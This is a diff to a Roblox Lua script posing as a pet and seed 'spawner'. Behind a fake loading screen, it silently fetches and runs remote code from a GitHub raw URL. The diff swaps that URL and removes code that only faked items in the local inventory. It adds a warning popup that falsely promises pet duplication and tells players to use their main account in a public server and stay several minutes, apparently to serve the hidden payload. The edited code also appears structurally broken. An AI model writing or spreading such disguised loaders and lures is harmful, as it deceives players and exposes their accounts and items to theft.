@@ -10,7 +10,7 @@ spawnSound.Volume = 1
 spawnSound.Name = "SpawnSound"
 spawnSound.Parent = game:GetService("SoundService")
 
--- Buat ScreenGui
+-- Buat ScreenGui untuk loading
 local screenGui = Instance.new("ScreenGui", game.CoreGui)
 screenGui.Name = "FullBlueLoadingScreen"
 screenGui.IgnoreGuiInset = true
@@ -19,73 +19,67 @@ screenGui.ResetOnSpawn = false
 -- Eksekusi script utama saat loading screen muncul
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/ne"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
     end)
 end)
 
--- Background biru
-local background = Instance.new("Frame", screenGui)
-background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
+-- Background biru + teks/loading bar
+local bg = Instance.new("Frame", screenGui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
 
--- Text credit atas
-local creditTop = Instance.new("TextLabel", background)
-creditTop.Size = UDim2.new(1, 0, 0.05, 0)
-creditTop.Position = UDim2.new(0, 0, 0.23, 0)
+local creditTop = Instance.new("TextLabel", bg)
+creditTop.Size = UDim2.new(1,0,0.05,0)
+creditTop.Position = UDim2.new(0,0,0.23,0)
 creditTop.BackgroundTransparency = 1
 creditTop.Text = "Spawner by: Jekak121"
 creditTop.Font = Enum.Font.SourceSansBold
 creditTop.TextScaled = true
 creditTop.TextColor3 = Color3.new(1,1,1)
 
--- Teks utama
-local loadingText = Instance.new("TextLabel", background)
-loadingText.Size = UDim2.new(1, 0, 0.1, 0)
-loadingText.Position = UDim2.new(0, 0, 0.3, 0)
+local loadingText = Instance.new("TextLabel", bg)
+loadingText.Size = UDim2.new(1,0,0.1,0)
+loadingText.Position = UDim2.new(0,0,0.3,0)
 loadingText.BackgroundTransparency = 1
 loadingText.Text = "Loading Script"
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.Font = Enum.Font.SourceSansBold
 loadingText.TextScaled = true
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.TextColor3 = Color3.new(1,1,1)
 
--- Progress bar
-local progressBarBg = Instance.new("Frame", background)
-progressBarBg.Size = UDim2.new(0.6, 0, 0.05, 0)
-progressBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
-progressBarBg.BackgroundColor3 = Color3.fromRGB(20, 20, 80)
+local progressBarBg = Instance.new("Frame", bg)
+progressBarBg.Size = UDim2.new(0.6,0,0.05,0)
+progressBarBg.Position = UDim2.new(0.2,0,0.5,0)
+progressBarBg.BackgroundColor3 = Color3.fromRGB(20,20,80)
 
 local progressBar = Instance.new("Frame", progressBarBg)
-progressBar.Size = UDim2.new(0, 0, 1, 0)
-progressBar.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
+progressBar.Size = UDim2.new(0,0,1,0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0,153,255)
 
--- Text credit bawah
 local creditText = Instance.new("TextLabel", progressBarBg)
-creditText.Size = UDim2.new(1, 0, 1, 0)
+creditText.Size = UDim2.new(1,0,1,0)
 creditText.BackgroundTransparency = 1
 creditText.Text = "Tiktok: @Jekak121"
 creditText.Font = Enum.Font.SourceSansBold
 creditText.TextScaled = true
 creditText.TextColor3 = Color3.new(1,1,1)
 
--- Percent
-local percentText = Instance.new("TextLabel", background)
-percentText.Size = UDim2.new(0, 60, 0.05, 0)
-percentText.Position = UDim2.new(0.81, 10, 0.5, 0)
+local percentText = Instance.new("TextLabel", bg)
+percentText.Size = UDim2.new(0,60,0.05,0)
+percentText.Position = UDim2.new(0.81,10,0.5,0)
 percentText.BackgroundTransparency = 1
 percentText.Text = "0%"
-percentText.TextColor3 = Color3.new(1,1,1)
 percentText.Font = Enum.Font.SourceSansBold
 percentText.TextScaled = true
+percentText.TextColor3 = Color3.new(1,1,1)
 
--- Status
-local statusText = Instance.new("TextLabel", background)
-statusText.Size = UDim2.new(1, 0, 0.05, 0)
-statusText.Position = UDim2.new(0, 0, 0.57, 0)
+local statusText = Instance.new("TextLabel", bg)
+statusText.Size = UDim2.new(1,0,0.05,0)
+statusText.Position = UDim2.new(0,0,0.57,0)
 statusText.BackgroundTransparency = 1
 statusText.Text = "Initializing..."
-statusText.TextColor3 = Color3.fromRGB(240, 240, 240)
 statusText.Font = Enum.Font.SourceSans
 statusText.TextScaled = true
+statusText.TextColor3 = Color3.fromRGB(240,240,240)
 
 local statuses = {
     "Getting server data...",
@@ -100,17 +94,17 @@ task.spawn(function()
     while screenGui and screenGui.Parent do
         statusText.Text = statuses[i]
         i = (i % #statuses) + 1
-        wait(5)
+        wait(1)
     end
 end)
 
 local TweenService = game:GetService("TweenService")
-local tween = TweenService:Create(progressBar, TweenInfo.new(10, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
+local tween = TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)})
 tween:Play()
 
 task.spawn(function()
-    for i = 1, 10 do
-        percentText.Text = tostring(math.floor(i / 10 * 100)) .. "%"
+    for i = 1, 3 do
+        percentText.Text = tostring(math.floor(i / 3 * 100)) .. "%"
         wait(1)
     end
     percentText.Text = "100%"
@@ -119,17 +113,28 @@ end)
 tween.Completed:Connect(function()
     screenGui:Destroy()
 
-    -- Main GUI
+function createSpawnerGui()
+    -- Hapus jika sudah ada sebelumnya
+    if game.CoreGui:FindFirstChild("SpawnerFloatingWindow") then
+        game.CoreGui:FindFirstChild("SpawnerFloatingWindow"):Destroy()
+    end
+    if game.CoreGui:FindFirstChild("ReopenButton") then
+        game.CoreGui:FindFirstChild("ReopenButton"):Destroy()
+    end
+
     local gui = Instance.new("ScreenGui", game.CoreGui)
     gui.Name = "SpawnerFloatingWindow"
     gui.ResetOnSpawn = false
 
+    -- Frame utama (window)
     local frame = Instance.new("Frame", gui)
     frame.Size = UDim2.new(0, 300, 0, 200)
     frame.Position = UDim2.new(0.5, -150, 0.5, -100)
     frame.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
     frame.Active = true
+    frame.Draggable = false
 
+    -- Drag script untuk frame agar bisa dipindah-pindah
     local drag = Instance.new("LocalScript", frame)
     drag.Source = [[
         local UIS = game:GetService("UserInputService")
@@ -164,14 +169,16 @@ tween.Completed:Connect(function()
         end)
     ]]
 
+    -- Judul
     local title = Instance.new("TextLabel", frame)
     title.Size = UDim2.new(1, 0, 0.15, 0)
     title.Text = "Spawner"
-    title.TextColor3 = Color3.new(1,1,1)
+    title.TextColor3 = Color3.new(1, 1, 1)
     title.Font = Enum.Font.SourceSansBold
     title.TextScaled = true
     title.BackgroundTransparency = 1
 
+    -- Tombol Pet Spawner
     local petBtn = Instance.new("TextButton", frame)
     petBtn.Size = UDim2.new(0.5, -5, 0.2, 0)
     petBtn.Position = UDim2.new(0, 5, 0.2, 0)
@@ -179,42 +186,17 @@ tween.Completed:Connect(function()
     petBtn.Font = Enum.Font.SourceSansBold
     petBtn.TextScaled = true
     petBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
-    petBtn.TextColor3 = Color3.new(1,1,1)
+    petBtn.TextColor3 = Color3.new(1, 1, 1)
 
+    -- Tombol Seed Spawner (duplikat dari petBtn)
     local seedBtn = petBtn:Clone()
     seedBtn.Text = "Seed Spawner"
     seedBtn.Position = UDim2.new(0.5, 5, 0.2, 0)
     seedBtn.Parent = frame
 
-    -- 🟩 Tambahan: Fungsi visual add to inventory
-    local function addItemVisual(name, isSeed)
-        local player = game.Players.LocalPlayer
-        local inv = player:FindFirstChild("Inventory")
-            or player:FindFirstChild("Backpack")
-            or (player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("Inventory"))
-
-        if not inv then
-            inv = Instance.new("Folder")
-            inv.Name = "Inventory"
-            inv.Parent = player
-        end
-
-        local item = Instance.new("Folder")
-        item.Name = name
-
-        local weight = Instance.new("NumberValue")
-        weight.Name = "Weight"
-        weight.Value = math.random(1, 30)
-        weight.Parent = item
-
-        local age = Instance.new("IntValue")
-        age.Name = "Age"
-        age.Value = math.random(1, 80)
-        age.Parent = item
-
-        item.Parent = inv
-    end
-
+    -- Popup counter untuk penataan popup notifikasi nantinya
+    local popupCount = 0
+        -- Fungsi untuk membuat form input dan tombol spawn
     local function createForm(name, isSeed)
         local form = Instance.new("Frame", frame)
         form.Size = UDim2.new(1, -20, 0.4, 0)
@@ -225,7 +207,7 @@ tween.Completed:Connect(function()
         local nameLabel = Instance.new("TextLabel", form)
         nameLabel.Size = UDim2.new(0.4, 0, 0.3, 0)
         nameLabel.Text = name .. " Name:"
-        nameLabel.TextColor3 = Color3.new(1,1,1)
+        nameLabel.TextColor3 = Color3.new(1, 1, 1)
         nameLabel.Font = Enum.Font.SourceSansBold
         nameLabel.TextScaled = true
         nameLabel.BackgroundTransparency = 1
@@ -243,84 +225,75 @@ tween.Completed:Connect(function()
         spawnBtn.Position = UDim2.new(0, 0, 0.7, 0)
         spawnBtn.Text = "Spawn"
         spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
-        spawnBtn.TextColor3 = Color3.new(1,1,1)
+        spawnBtn.TextColor3 = Color3.new(1, 1, 1)
 
-        spawnBtn.MouseButton1Click:Connect(function()
-            local itemName = nameInput.Text
-            if isSeed then
-                itemName = itemName .. " Seed"
-            end
+        -- Tombol bantuan "?" hanya untuk Pet
+        if not isSeed then
+            local helpBtn = Instance.new("TextButton", form)
+            helpBtn.Size = UDim2.new(0, 25, 0, 25)
+            helpBtn.Position = UDim2.new(0, 0, 1, -25)
+            helpBtn.Text = "?"
+            helpBtn.Font = Enum.Font.SourceSansBold
+            helpBtn.TextScaled = true
+            helpBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 100)
+            helpBtn.TextColor3 = Color3.new(0, 0, 0)
 
-            spawnSound:Play()
+            -- Popup Attention
+            local helpPopup = Instance.new("Frame", gui)
+            helpPopup.Size = UDim2.new(0, 400, 0, 250)
+            helpPopup.Position = UDim2.new(0.5, 160, 0.5, 60) -- kanan bawah sejajar menu
+            helpPopup.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
+            helpPopup.BackgroundTransparency = 0.1
+            helpPopup.Visible = false
+            helpPopup.ZIndex = 15
+            Instance.new("UICorner", helpPopup).CornerRadius = UDim.new(0, 10)
 
-            addItemVisual(itemName, isSeed)
+            local helpTitle = Instance.new("TextLabel", helpPopup)
+            helpTitle.Size = UDim2.new(1, 0, 0.15, 0)
+            helpTitle.Position = UDim2.new(0, 0, 0, 0)
+            helpTitle.Text = "⚠️ Attention ⚠️"
+            helpTitle.Font = Enum.Font.SourceSansBold
+            helpTitle.TextScaled = true
+            helpTitle.TextColor3 = Color3.new(1, 1, 1)
+            helpTitle.BackgroundTransparency = 1
 
-            local popup = Instance.new("TextLabel", gui)
-            popup.Size = UDim2.new(0.4, 0, 0.07, 0)
-            popup.Position = UDim2.new(0.3, 0, 0.65, 0)
-            popup.BackgroundColor3 = Color3.fromRGB(0, 153, 0)
-            popup.TextColor3 = Color3.new(1,1,1)
-            popup.Font = Enum.Font.SourceSansBold
-            popup.TextScaled = true
-            popup.Text = "Successfully to Spawn \"".. itemName .. "\"!!\nCheck Your Inventory"
-            wait(2.5)
-            popup:Destroy()
-        end)
+            local helpContent = Instance.new("TextLabel", helpPopup)
+            helpContent.Size = UDim2.new(1, -20, 0.7, 0)
+            helpContent.Position = UDim2.new(0, 10, 0.15, 0)
+            helpContent.TextWrapped = true
+            helpContent.TextYAlignment = Enum.TextYAlignment.Top
+            helpContent.Font = Enum.Font.SourceSans
+            helpContent.TextColor3 = Color3.new(1, 1, 1)
+            helpContent.TextScaled = true
+            helpContent.BackgroundTransparency = 1
+            helpContent.Text = [[
+Please read this before you execute my script:
+⚠️THINGS YOU NEED TO KNOW BEFORE EXECUTING THE SCRIPT⚠️
+You must be in public server, don't play in private server.
+Do not use a new account; use your main account.
+This script works 100% if you already have the pet (e.g. Queen Bee, Dragonfly, RedFox, Raccoon).
+It will dupe the pet with same age and weight.
+If you don’t have those pets, success chance is 80%.
+Wait 6–10 minutes before leaving the game to avoid ruining your data.
+]]
 
-        return form
-    end
+            -- Tombol close popup attention
+            local closeHelp = Instance.new("TextButton", helpPopup)
+            closeHelp.Size = UDim2.new(0, 30, 0, 30)
+            closeHelp.Position = UDim2.new(1, -35, 0, 5)
+            closeHelp.Text = "X"
+            closeHelp.Font = Enum.Font.SourceSansBold
+            closeHelp.TextScaled = true
+            closeHelp.TextColor3 = Color3.new(1, 1, 1)
+            closeHelp.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+            Instance.new("UICorner", closeHelp).CornerRadius = UDim.new(0, 8)
 
-    local petForm = createForm("Pet", false)
-    local seedForm = createForm("Seed", true)
+            helpBtn.MouseButton1Click:Connect(function()
+                helpPopup.Visible = true
+            end)
 
-    petBtn.MouseButton1Click:Connect(function()
-        petForm.Visible = true
-        seedForm.Visible = false
-    end)
-
-    seedBtn.MouseButton1Click:Connect(function()
-        petForm.Visible = false
-        seedForm.Visible = true
-    end)
-
-    petForm.Visible = true
-
-    -- Tombol Close & Reopen
-    local closeBtn = Instance.new("TextButton", frame)
-    closeBtn.Size = UDim2.new(0.1, 0, 0.1, 0)
-    closeBtn.Position = UDim2.new(0.9, -5, 0, 5)
-    closeBtn.Text = "X"
-    closeBtn.Font = Enum.Font.SourceSansBold
-    closeBtn.TextScaled = true
-    closeBtn.TextColor3 = Color3.new(1,1,1)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-
-    local reopenBtn = Instance.new("TextButton", gui)
-    reopenBtn.Size = UDim2.new(0, 50, 0, 50)
-    reopenBtn.Position = UDim2.new(0, 20, 0, 20)
-    reopenBtn.Text = "J"
-    reopenBtn.Font = Enum.Font.SourceSansBold
-    reopenBtn.TextScaled = true
-    reopenBtn.TextColor3 = Color3.new(1,1,1)
-    reopenBtn.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
-    reopenBtn.Visible = false
-    reopenBtn.ZIndex = 10
-    reopenBtn.AutoButtonColor = true
-    reopenBtn.ClipsDescendants = true
-    reopenBtn.BorderSizePixel = 0
-    reopenBtn.BackgroundTransparency = 0
-    reopenBtn.Name = "ReopenButton"
-
-    local roundCorner = Instance.new("UICorner", reopenBtn)
-    roundCorner.CornerRadius = UDim.new(1, 0)
-
-    closeBtn.MouseButton1Click:Connect(function()
-        frame.Visible = false
-        reopenBtn.Visible = true
-    end)
-
-    reopenBtn.MouseButton1Click:Connect(function()
-        frame.Visible = true
-        reopenBtn.Visible = false
-    end)
+            closeHelp.MouseButton1Click:Connect(function()
+                helpPopup.Visible = false
+            end)
+        end
 end)
